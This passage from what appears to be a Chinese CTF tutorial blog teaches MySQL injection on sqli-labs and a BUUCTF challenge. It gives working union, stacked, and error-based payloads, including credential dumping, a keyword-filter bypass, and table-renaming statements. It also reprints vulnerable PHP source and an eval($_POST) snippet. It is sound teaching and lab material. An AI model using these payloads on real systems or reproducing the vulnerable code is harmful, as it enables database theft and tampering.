title="字符串处理函数"></a>字符串处理函数</h3><p>在sql中，字符串通常使用一对单引号表示。</p><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>concat(s1,s2,s3…)</td><td>无任何分隔地连接字符串</td></tr><tr><td>concat_ws(char,s1,s2,s3…)</td><td>有分隔地连接字符串</td></tr><tr><td>group_concat(s1)</td><td>连接s1列的所有记录并逗号分隔</td></tr><tr><td>load_file(file)</td><td>读取文件</td></tr><tr><td>into outfile ‘file’</td><td>写文件</td></tr><tr><td>ascii(str)</td><td>字符串的ASCII码值</td></tr><tr><td>ord(str)</td><td>返回字符串第一个字符的ASCI值</td></tr><tr><td>mid(str,start,length)</td><td>返回一个字符串的一部分</td></tr><tr><td>substr(str,start,length)</td><td>返回一个字符串的一部分</td></tr><tr><td>length(str)</td><td>返回字符串长度</td></tr><tr><td>left(str,length)</td><td>返回字符串的前缀</td></tr><tr><td>rigth(str,length)</td><td>返回字符串的后缀</td></tr></tbody></table><h3 id="sql注入常用函数"><a href="#sql注入常用函数" class="headerlink" title="sql注入常用函数"></a>sql注入常用函数</h3><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>extractvalue(xml,Xpath)</td><td>使用 XPathtable 示法从 XML 字符串中提取值</td></tr><tr><td>UpdateXML(xml,Xpath,replacement)</td><td>返回替换的 XML 片段</td></tr><tr><td>sleep(sec)</td><td>程序休眠对应秒数</td></tr><tr><td>if(expression,truepart,falsepart)</td><td>如果表达式为真返回第二个参数，否则返回第三个参数</td></tr><tr><td>char()</td><td>返回整数ASCII代码字符组成的字符串</td></tr><tr><td>strcmp(str1,str2)</td><td>比较两个字符串str1&gt;str2返回1，相等返回0，否则返回-1</td></tr><tr><td>IFNULL(arg1,arg2)</td><td>参数1不为NULL返回参数1，否则返回参数2</td></tr><tr><td>exp(pow)</td><td>返回e的指数幂</td></tr></tbody></table><h2 id="Mysql内置数据库"><a href="#Mysql内置数据库" class="headerlink" title="Mysql内置数据库"></a>Mysql内置数据库</h2><ul><li><code>Mysql</code>：保存账户信息，权限信息，存储过程，event，时区等信息</li><li><code>sys</code>：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</li><li><code>performance_schema</code>：用于收集数据库服务器性能参数</li><li><code>information_schema</code>：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。</li></ul><p>这里看似很复杂，实际上你只需要知道这个 <code>performance_schema</code> 数据库就可以了。对于一个未知的数据库，我们首先需要知道它的数据库名，数据表名，知道表名之后还得知道字段名，这样我们才能使用类似这样的 <code>sql</code> 语句 <code>select 字段名 from  数据库.表名;</code> 去泄露数据库的具体信息。</p><p>我们 <code>navicat</code> 打开这个数据库观察一下有什么表</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/1.png" alt="1"> </p><p>看着很多，其实我们只需要关心三个表：<code>schemata</code>，<code>tables</code>，<code>columns</code>，它们分别能爆出数据库名，表名和字段名。</p><p>我们先看看第一个表 <code>schemata</code> 的具体信息：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/2.png" alt="2"></p><p>可以看到里面的<code>schema_name</code> 字段的值就是我们当前这个数据库系统中所有的数据库的名字，从左边也可以一一对应看到对应的数据库。</p><p>然后看看第二个表 <code>tables</code> 的信息。因为有点多我们看主要的：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/3.png" alt="3"></p><p>可以看到里面有一个 <code>table_name</code> 字段就是整个数据库系统的所有表名，然后前面的 <code>table_schema</code> 就是这个表对应的数据库名。这里也可以看到我们这个数据库能从中找到 <code>tables</code> 和 <code>schemata</code> 这两个表名，以及其它乱七八糟的在上一张图也都有显示。</p><h2 id="获得数据库信息的其它方式"><a href="#获得数据库信息的其它方式" class="headerlink" title="获得数据库信息的其它方式"></a>获得数据库信息的其它方式</h2><p>在我们有一个 <code>mysql</code> 连接的情况下，我们想查看所有的数据库很简单，一句 <code>show databases;</code> 即可解决，但是通常情况下我们这样子输入并不能很好的回显，如果把数据库名作为一条记录输出出来那处理起来会好很多。</p><p>我们想查看数据库还可以用这种方式：</p><p><code>select schema_name from information_schema.schemata;</code></p><p>我们对比一下两个指令的结果</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/4.png" alt="4"></p><p>可以看到结果基本就是一样的。然后我们想查看比如说 <code>world</code> 数据库的表名，我们一般先 <code>use world</code> 再 <code>show tables</code> 或者一句话 <code>show tables from world;</code> 直接输出表名，但是有 <code>information_schema</code> 这个数据库，我们就能通过这里把信息显示出来。</p><p><code>select table_name from information_schema.tables where table_schema=&#39;world&#39;;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/5.png" alt="5"></p><p>可以看到结果也是一模一样的。</p><p>剩下的爆字段就不演示了，同理的。</p><p><code>select column_name from information_schema.columns where table_name=&#39;city&#39;;</code></p><p>以上的 <code>payload</code> 可以直接在注入的地方加进去，只需要改一下表名和数据库名即可。</p><h2 id="sqli-labs环境搭建"><a href="#sqli-labs环境搭建" class="headerlink" title="sqli-labs环境搭建"></a>sqli-labs环境搭建</h2><p>主要学习的环境还是用的 <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> ，我是直接在主机上搭建，因为修改代码起来十分方便，一改就能见到效果。但是这么做确保切断了对外界的网络连接，或者心大一点就算了，想着没人会对自己的主机发起进攻的。</p><p>然后自己再搭建一个 <code>web</code> 服务，能访问就算成功了。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/6.png" alt="6"></p><p>在使用之前在 <code>sqli-labs\sql-connections\</code> 目录下的 <code>db-creds.inc</code> 中配置一下自己的用户名和密码，再点击 <code>setup</code> 把数据库先配置好，如果一切OK，那么进入第一关的效果应该是这样的：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><h2 id="sql注入详解"><a href="#sql注入详解" class="headerlink" title="sql注入详解"></a>sql注入详解</h2><p>在对一个 <code>ctf</code> 打 <code>sql</code> 注入的时候，我们第一步就是要寻找<strong>注入点</strong>。怎么寻找注入点呢，因为后端源码我们都是不知道的，所以我们只能通过抓包的方式观察所有能<strong>提交的参数</strong>进行 <code>sql</code> 注入的测试。</p><p>找到注入点之后我们还需要判断注入的类型。大体的注入分两类，一类是<strong>有回显的注入</strong>，另一类是<strong>没有回显的注入</strong>。一般情况下我们优先考虑有回显的注入，因为时间成本比较低，那么我们先来看看有回显的注入吧。</p><h3 id="有回显的注入"><a href="#有回显的注入" class="headerlink" title="有回显的注入"></a>有回显的注入</h3><p>什么叫有回显？查询到的数据库信息会<strong>直接显示</strong>出来，你能看到的就叫有回显，反之则是没有回显。有回显的注入有以下类型：</p><ol><li>联合查询的注入：通过union关键字泄露数据库信息</li><li>堆叠注入：通过重新执行一个 <code>sql</code> 语句的方式泄露数据库信息，或者直接增删改查数据库。</li><li>报错注入：通过一些特殊的函数报错把信息显示出来。</li><li>二次注入：咕咕咕</li></ol><h4 id="联合查询的注入"><a href="#联合查询的注入" class="headerlink" title="联合查询的注入"></a>联合查询的注入</h4><p>利用要求：有回显</p><p>假如你是 <code>admin</code> 登录之后，它页面可能会显示 <code>hello,admin</code>。那么这个 <code>hello</code> 后面就是一个回显的点，这里就可以用来泄露其它信息。这里需要怎么理解呢，假如它在登录的逻辑是这样写的：</p><p><code>select username,passowrd from data.user where username=&#39;$input_username&#39; and password=&#39;$input_password&#39;;</code><br>然后我们判断你的账号密码是否正确就主要看它是否能查找到记录，如果找到，那么我选取这条记录的第一个记录的 <code>username</code> 字段，然后输出这个，就达到了它成功登录了什么账号，我输出那个账号的目的了。</p><p>至于上面为什么说是第一条记录呢，这里你需要这么看：<code>select</code> 的返回结果可能有很多，而不管它返回了一条还是多条它都是一个数据集，是个二维的表。因此选择第一条记录是开发人员默认会加上的，此时我只需使得前面的语句查询失败（返回空数据集）并选取其它内容用 <code>union</code> 合并这个数据集，并把这里的其它内容替换成我想知道的内容，比如它的数据库名，表名，然后它这里就会原样输出这些信息了，我们就知道了。这里需要知道 <code>union</code> 是合并两个数据集的，因此两个数据集的宽度（字段数）必须一样，数据类型可以不一样，返回 <code>php</code> 处理之后都会变成字符串类型其实。</p><p>这里我们拿刚刚搭建的环境的第一关来做测试：</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><p>这里我们不需要寻找测试点了，它这里已经贴心地提醒我们用 <code>get</code> 传一个 <code>id</code> 参数进去了，因此我们先试 <code>1</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/8.png" alt="8"></p><p>可以看到我输入一个 <code>1</code> 它直接贴心的告诉了我们账号和密码是什么，这里显示的账号和密码就是回显的点。</p><p>我们再测试这个参数是否能注入，最简单最直接的方法就是打个单引号或者双引号进去。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/9.png" alt="10"></p><p>可以发现数据库报错，那就说明这个参数是可以注入的。</p><p>因此我们用刚刚提到的方法，先另前一个语句查询失败（空数据集），然后再 <code>union</code> 上一个数据集，这个数据集是我们任何我们想泄露的信息，首先我们假装对数据库一无所知，我们第一步就是要知道这里有多少数据库，分别什么名字。</p><p>根据报错信息可以略微猜测一下它的写法 <code>select username,password from xxx.yyy where id=&#39;$input_id&#39; limit 0,1</code></p><p>我们先用引号闭合前面的参数，然后后面加上一个 <code>and 1=0</code> 让前面的数据集必为空，然后再 <code>union select 1,2--+</code> ，这里需要测试参数的个数，因为你不知道前面有几个字段，不过这里可以姑且先猜个 <code>2</code>，因为目前看来就找了账号和密码嘛，最后用 <code>--+</code> 去注释后面的单引号。结果发现数据库报了这个错误：<code>The used SELECT statements have a different number of columns</code>，这个也不难看出来是因为 <code>union</code> 前后的数据集含有不同的列数，也就是字段数不一样，所以这里不是两个，那我们换成 <code>3</code> 个参数再看看，如果不行就接着换，知道不报这个错误为止。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/10.png" alt="11"></p><p>这里可以看到结果出来了，那么前面是有三列的，并且账号在第二列，密码在第三列，第一列大概率是这个 <code>id</code> 了。那么我们就朝着这几个回显的地方去改参数，比如我想知道数据库名，就用前面的方法。但是这里需要知道一点，那就是回显的地方这里只能存在一条记录，如果存在多条记录将报错。也就是说我可以把 <code>2</code> 替换成 <code>select xxx from zzzx.yyy</code> 但是必须保证结果集只能含有一条记录一个字段，否则会报错。一个字段没有问题，但是一条记录的话，你会想到 <code>limit</code>，可以，但是太慢了，如果数据记录很多一条一条打要累死人，这里我们用到之前讲过的聚合函数 <code>group_concat</code>，聚合函数会把所有记录整合成一条记录，并且我们还能一次输出多条记录的信息，那简直一举多得了。</p><p>我们开始报数据库名吧 <code>select schema_name from information_schema.schemata</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/11.png" alt="12"></p><p>可以看到我们爆出了当前数据库名和所有数据库名，这里需要注意，我们在替换为语句的时候，语句一定要加上括号，不然它的 <code>sql</code> 会分析失败。</p><p>然后我们爆一下 <code>security</code> 数据库的信息，先爆表名，其实只需要替换一下就可以了：<code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/12.png" alt="13"></p><p>我们主要收集一下用户信息吧，所以看看 <code>users</code> 数据表的内容，我们先获取字段名，一样一样地往上套就完事了：<code>select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/13.png" alt="13"></p><p>然后我们这里我们就看到了所有的字段名，我们这里点到为止，把所有用户名和密码爆出来就结束吧。</p><p><code>select group_concat(username) from security.users</code> 和 <code>select group_concat(password) from security.users</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/14.png" alt="14"></p><p>好，到这里我们就把数据库的信息成功获取到了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>我们可以看到联合查询注入十分方便，几步到位可以把数据库全部泄露出来，但是利用条件一般比较苛刻，需要有回显点才能实现。</p><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>堆叠注入的原理就是使用引号隔开前一个查询语句，再自己书写另外的 <code>sql</code> 语句以此达到任意执行 <code>sql</code> 语句的目的。由于结果很难回显，我们一般这个用的不多，因为我们主要还是获取信息为主，而不是要去修改它的数据库。</p><p>这个演示我们用 <code>buuctf</code> 里面的一道题吧，是来自2019强网杯的一道题目。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/15.png" alt="15"></p><p>先不管它怎么说，有提交窗口先正常提交看看它原本的业务逻辑。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/16.png" alt="16"></p><p>看这个输出格式，应该也是从数据库里按照一个应该是 <code>id</code> 字段查询，查询结果为两个字段，然后用 <code>var_dump</code> 输出第一条记录的信息，然后按照国际惯例加个分号看它是否报错。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/17.png" alt="17"></p><p>报错了说明有注入点。</p><p>我们当然还是先试试联合查询注入，用 <code>1&#39; union select 1,2--+</code>，然后我们看到它回显了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>它过滤了很多关键字导致我们没办法直接使用联合查询注入，并且正则后面的 <code>/i</code> 表示大小写全匹配，那看来它是不想让你用联合查询注入，我们不妨先试试堆叠注入。我们可以先去 <code>mysql</code> 连接里面自己试试堆叠注入，比如我先实现一个逻辑，这个逻辑仅仅是查询每个数据库的表，那么数据库参数可控，我们就是这么写 <code>sql</code>  语句的：<code>select table_name from information_schema.tables where table_schema=&#39;$input_database&#39;;</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/18.png" alt="18"></p><p>可以看到随便输入一个数据库可以实现功能，那么我们让 <code>$input_database=1&#39;;show databases;--</code>，经过拼接之后形成了：</p><p><code>select table_name from information_schema.tables where table_schema=&#39;1&#39;;show databases;--&#39;;</code>。可以看到我们在参数中输入了其它的 <code>sql</code> 语句。那我们看看结果如何呢？不出意外地执行了我们输入的 <code>show databases</code> 指令。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/19.png" alt="19"></p><p>所以你也就清楚了堆叠注入是怎么一回事，我们试试看，一般题目里面堆叠注入都没有很好的回显，但是这题它有，至于为什么能有我们等会可以分析一下它题目的源码。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/20.png" alt="20"></p><p>再通过 <code>show tables</code> 我们可以发现有两张表 <code>1919810931114514</code> 和 <code>words</code>。然后我们下一步可以用 <code>show columns from table_name</code> 的方式去显示表中所有的字段名。先看看 <code>words</code> 表，发现有 <code>id</code> 和 <code>data</code> 字段，这里大胆点猜测，我们应该是根据 <code>id</code> 去查询 <code>data</code>。它的 <code>sql</code> 语句大概是 <code>select data from supersqli.words where id=&#39;$input_id&#39;</code>。</p><p>这里一个烫芝士注意一下啊，就是当数据库名或表名或列名可能引起歧义的时候，需要使用反引号将其包裹。比如你 <code>select 1,2,3</code> 我并不知道你想找的是 1,2,3 三个数值还是这 1,2,3 是列名。那么为了消除这个歧义我们在这个时候使用反引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `1`,`2`,`3`</span><br></pre></td></tr></table></figure><p>上述写法就是表示 1,2,3 代表列名，反引号在键盘上数字 <code>1</code> 的左边。</p><p>这里因为是全数字，所以我们用反引号才能显示出它所有的列，我们可以看到只有一个 <code>flag</code> 列。那 <code>flag</code> 应该是在里面，我们需要查询出它，这里就可以用到堆叠注入的另一种姿势：预编译。</p><p>我们也先来看看预编译的一般用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql=&#x27;show databases&#x27;;</span><br><span class="line">prepare ext from @sql;</span><br><span class="line">execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/21.png" alt="21"></p><p>可以发现它成功执行了 <code>show databases</code>，你可能会觉得一举两得了，但是这对于我们绕过 <code>WAF</code> 还是很有帮助的，它不让出现 <code>select</code> 这个单词的任意大小写形式，我们就用前面的字符串拼接函数 <code>concat</code> 就可以不出现 <code>select</code> 单词但是能执行 <code>select</code> 语句。</p><p>我们还是在这个 <code>cmd</code>  里面去运行。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/22.png" alt="22"></p><p>可以看到，我们利用 <code>concat</code> 函数和预编译的方式在全语句没有出现过 <code>select</code> 的情况下使用了 <code>select</code> 语句才能干的事。</p><p>因为在 <code>php</code> 里面，执行语句的时候才会产生一个进程去执行 <code>sql</code> 语句，语句结束进程也就结束，如果我先 <code>set @sql=&#39;xxx&#39;</code> 那么再次查询不会保存这个变量的结果，这里就需要把多条语句整合成一条，这也是堆叠注入特有的一个优势吧。</p><p>我们的 <code>payload</code> 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p>我们打进去的时候发现 <code>WAF</code> 还有一层检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr(<span class="variable">$inject</span>, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个很好绕过，因为这个函数它判断大小写的，我们对这两个关键字随便一个字符大写即可绕过，我们最后的 <code>payload</code> 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @sql=concat(&#x27;se&#x27;,&#x27;lect flag from `1919810931114514`;&#x27;);Prepare ext from @sql;execute ext;</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/23.png" alt="23"></p><p>成功获得 <code>flag</code>。</p><p>堆叠注入还有一个很厉害的姿势就是修改数据库，但是请注意不要删库，因为这样的话你可能就拿不到 <code>flag</code>。如果拿完 <code>flag</code> 再把 <code>flag</code> 删了，如果环境你专用你随便玩，公用的话就容易被别人喷了，万一环境不能重置，那你不是直接没了。</p><p>第二种方式是把装 <code>flag</code> 的表改成本来的逻辑查询的表，也就是 <code>words</code> 表。我们把那个表的名字改成 <code>words</code>，然后它可能是根据 <code>id</code> 查询的，我们就把 <code>flag</code> 列改成 <code>id</code> 也许它是根据 <code>words</code> 查询的，我们到时候改一下就好了。</p><p>先写出我们这几步的 <code>sql</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to `111`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>如果成功的话我们只需要一个万能密码即可查出所有原 <code>flag</code> 表的所有记录。</p><p>我们的 <code>payload</code> 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;rename table `words` to `111`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);</span><br></pre></td></tr></table></figure><p>执行之后我们使用 <code>1&#39; or 1=1--+</code> 得到 <code>flag</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/24.png" alt="24"></p><p>堆叠注入为什么可以实现，下面就到了我们的源码环节了，没有官方的源码，只是从网上寻找到了差不多类似的，复现出来也基本一致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    姿势: &lt;input type=&quot;text&quot; name=&quot;inject&quot; value=&quot;1&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">function waf2($inject) &#123;</span><br><span class="line">    strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) &amp;&amp; die(&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;inject&#x27;])) &#123;</span><br><span class="line">    $id = $_GET[&#x27;inject&#x27;];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    //多条sql语句</span><br><span class="line">    $sql = &quot;select * from `words` where id = &#x27;$id&#x27;;&quot;;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    if ($res)&#123;//使用multi_query()执行一条或多条sql语句</span><br><span class="line">      do&#123;</span><br><span class="line">        if ($rs = $mysqli-&gt;store_result())&#123;//store_result()方法获取第一条sql语句查询结果</span><br><span class="line">          while ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); //关闭结果集</span><br><span class="line">          if ($mysqli-&gt;more_results())&#123;  //判断是否还有更多结果集</span><br><span class="line">            echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;while($mysqli-&gt;next_result()); //next_result()方法获取下一结果集，返回bool值</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;error &quot;.$mysqli-&gt;errno.&quot; : &quot;.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  //关闭数据库连接</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中间的源码环节可以看到它在执行 <code>sql</code> 语句的时候使用了 <code>multi_query</code> 函数，并且会输出所有的结果集。所以这题可以用堆叠注入的原因就在这里，我们可以很轻易地获得多条语句的回显，而在一般情况下是不能的，所以这题就是专门让你用堆叠注入的。</p><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>我们也来小总结一下堆叠注入：优点当然就是我们可以很轻易地执行多条 <code>sql</code> 语句，但是要求要回显所有的结果集，否则很多信息都是暴不出来的。如果你在普通的题目上使用堆叠注入，那么前面那个 <code>select</code> 就算是空集那它也不会返回第二个结果集的内容，所以这也成为了堆叠注入的局限性。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用一些函数的特性，通过它们的报错把信息泄露出来，当然前提是你可以看到它报错。</p><p>我们前面介绍的有关 <code>xml</code> 的函数都是报错注入常用的函数，我们先来看第一个 <code>updatexml</code> 。至于报错注入是什么呢？我来打个比方，有以下程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>已知包含的文件是一个 <code>$flag</code> 变量，标准输出流关闭的情况下如何知道 <code>flag</code> 的值？这么说吧，我们平时的一切正常输出都是标准输出流打印出来的。只有报错信息是标准错误流打印的，如果这里强制让我利用错误流输出，那么可以直接选择 <code>rm($flag)</code>。当它执行的时候这个函数就会报错 <code>xxx not found</code>，这个会通过错误流打印，而这里的 <code>xxx</code> 就是 <code>$flag</code> 变量的值。所以我们会让关键信息执行，然后通过报错使得打印这个关键的信息，因为我们不可能就是让它打印出 <code>$flag not found</code>，这里的 <code>$flag</code> 必须被解析执行成它里面的内容才是对我们有用的。</p><p>在有些情况下，它标准输出流并不能给我们带来什么回显的地方，比如常见的盲注，它标准输出流只会打印 <code>You are in</code> 或者 <code>You are not in</code>。这里如果它显示报错信息，我们同样可以使用报错注入去泄露信息。</p><p>我们看看第一个函数：<code>updatexml(xml,find,replacement)</code>就是一个  <code>xml</code> 替换的函数，这里中间的 <code>find</code> 参数必须使用 <code>Xpath</code> 格式，否则会报错并使用标准错误流打印第二个参数。</p><p>我们来试试看：使用如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,user(),0x7e),1);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/25.png" alt="25"></p><p>可以看到虽然提示错误，但是还是成功打印了我们想要的内容，能报错注入的函数有很多，报错注入也不过多演示了。</p><h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>报错注入利用条件和联合查询注入差不多，报错注入需要能看到报错信息，报错信息是一个回显的点，有之后就跟联合查询注入差不多了，把 <code>updatexml</code> 函数第二个参数替换成自己想知道的东西。</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>咕咕咕</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>无回显的注入又称为盲注。如果无回显或者回显的内容和数据库的内容没有直接关系，那么这个时候我们只能采用盲注的手段。盲注根据利用手法的不同又分为以下两种</p><ol><li>布尔盲注：如果网站根据有无查找成功，给你返回的有且仅有两个结果。我们的做法一般是，让前面 <code>where</code> 的条件恒为假，再 <code>or</code> 一个自己要判断的语句。或者让前面恒为真，再 <code>and</code> 一个我们要判断的结果，这样的话判断的就是我们想知道的结果了。</li><li>时间盲注：使用一个判断语句，再 <code>and</code> 或 <code>or</code> 一个 <code>sleep</code> 函数，根据是否休眠判断条件是否为真。</li><li>DNSlog盲注：当目标不能打印任何数据库信息，但是可以发起DNS请求的时候可以使用这个方式，这个讲道理不能叫盲注了，因为它能回显数据。</li></ol><p>盲注的特点就是，我一次打过去我最多知道 <code>1bit</code> 的数据，所以盲注手打是非常耗时的，下面我将演示手打和写脚本打。虽然在某些时候 <code>sqlmap</code> 有奇效，但是你得想过，出题人不可能会出一道 <code>sqlmap</code> 能直接跑出答案的题目，所以真材实料还得自己学会。</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>我们打开 <code>sqli-labs-lesson5</code>。</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/26.png" alt="26"></p><p>可以看到它这里只回显了 <code>You are 